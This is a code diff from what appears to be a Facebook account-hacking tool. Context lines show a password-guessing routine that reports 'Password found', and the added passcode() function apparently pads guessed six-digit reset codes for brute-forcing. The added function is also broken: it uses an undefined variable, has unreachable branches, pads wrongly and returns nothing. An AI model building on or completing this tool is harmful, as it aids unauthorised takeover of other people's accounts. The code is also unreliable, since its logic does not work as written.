@@ -44,6 +44,32 @@ def try_password(self, email, password):
     if self.is_logged_in(data):
         print ('Password found: %s' % password )
         sys.exit()
+def passcode(reset):
+  if reset < 100000:
+    h = ""
+    code = ("0", str(y))
+    yo = h.join(code)
+  elif reset < 10000:
+    h = ""
+    code = ("0000", str(y))
+    yo = h.join(code)
+  elif reset < 1000:
+    h = ""
+    code = ("00000", str(y))
+    yo = h.join(code)
+  elif reset < 100:
+    h = ""
+    code = ("000000", str(y))
+    yo = h.join(code)
+  elif reset < 10:
+    h = ""
+    code = ("00000000", str(y))
+    yo = h.join(code)
+  elif reset < 0:
+    reset = 999999
+    yo = str(reset)
+  else:
+    yo = str(reset)
 
 def fb_hack():
   os.system('clear')
